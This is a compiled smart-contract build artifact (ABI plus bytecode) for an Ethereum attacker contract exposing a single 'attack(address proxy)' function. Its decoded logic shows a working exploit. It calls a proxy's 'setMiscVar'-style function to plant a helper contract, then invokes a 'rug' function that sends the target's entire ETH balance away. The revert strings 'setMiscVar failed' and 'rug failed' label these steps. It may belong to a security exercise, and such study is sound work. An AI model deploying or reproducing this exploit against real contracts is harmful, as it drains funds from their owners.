{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"proxy","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60c060405234801561000f575f80fd5b5060405161001c906100a2565b604051809103905ff080158015610035573d5f803e3d5ffd5b5073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250503373ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff16815250506100af565b61028a8061064983390190565b60805160a05161057a6100cf5f395f6101b801525f6063015261057a5ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063d018db3e1461002d575b5f80fd5b61004760048036038101906100429190610356565b610049565b005b5f8173ffffffffffffffffffffffffffffffffffffffff167f00000000000000000000000000000000000000000000000000000000000000006040516024016100929190610390565b6040516020818303038152906040527fded42f06000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161011c9190610415565b5f604051808303815f865af19150503d805f8114610155576040519150601f19603f3d011682016040523d82523d5f602084013e61015a565b606091505b505090508061019e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161019590610485565b60405180910390fd5b5f8273ffffffffffffffffffffffffffffffffffffffff167f00000000000000000000000000000000000000000000000000000000000000006040516024016101e791906104c3565b6040516020818303038152906040527f2af45832000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516102719190610415565b5f604051808303815f865af19150503d805f81146102aa576040519150601f19603f3d011682016040523d82523d5f602084013e6102af565b606091505b50509050806102f3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102ea90610526565b60405180910390fd5b505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610325826102fc565b9050919050565b6103358161031b565b811461033f575f80fd5b50565b5f813590506103508161032c565b92915050565b5f6020828403121561036b5761036a6102f8565b5b5f61037884828501610342565b91505092915050565b61038a8161031b565b82525050565b5f6020820190506103a35f830184610381565b92915050565b5f81519050919050565b5f81905092915050565b5f5b838110156103da5780820151818401526020810190506103bf565b5f8484015250505050565b5f6103ef826103a9565b6103f981856103b3565b93506104098185602086016103bd565b80840191505092915050565b5f61042082846103e5565b915081905092915050565b5f82825260208201905092915050565b7f7365744d697363566172206661696c65640000000000000000000000000000005f82015250565b5f61046f60118361042b565b915061047a8261043b565b602082019050919050565b5f6020820190508181035f83015261049c81610463565b9050919050565b5f6104ad826102fc565b9050919050565b6104bd816104a3565b82525050565b5f6020820190506104d65f8301846104b4565b92915050565b7f727567206661696c6564000000000000000000000000000000000000000000005f82015250565b5f610510600a8361042b565b915061051b826104dc565b602082019050919050565b5f6020820190508181035f83015261053d81610504565b905091905056fea2646970667358221220a127424274b12e78cfb1ec9bc7a3948a2430c0802a5266baa9b21cfb65ac0d4164736f6c63430008180033608060405234801561000f575f80fd5b5061026d8061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80632af458321461002d575b5f80fd5b61004760048036038101906100429190610153565b610049565b005b5f8173ffffffffffffffffffffffffffffffffffffffff164760405161006e906101ab565b5f6040518083038185875af1925050503d805f81146100a8576040519150601f19603f3d011682016040523d82523d5f602084013e6100ad565b606091505b50509050806100f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100e890610219565b60405180910390fd5b5050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610122826100f9565b9050919050565b61013281610118565b811461013c575f80fd5b50565b5f8135905061014d81610129565b92915050565b5f60208284031215610168576101676100f5565b5b5f6101758482850161013f565b91505092915050565b5f81905092915050565b50565b5f6101965f8361017e565b91506101a182610188565b5f82019050919050565b5f6101b58261018b565b9150819050919050565b5f82825260208201905092915050565b7f727567206661696c6564000000000000000000000000000000000000000000005f82015250565b5f610203600a836101bf565b915061020e826101cf565b602082019050919050565b5f6020820190508181035f830152610230816101f7565b905091905056fea26469706673582212209d8bc3ebaff8e61b4243358bf1f3c104dfee08e37e35c7d6b194c17b3b4430c964736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"attack(address)":"d018db3e"},"id":19}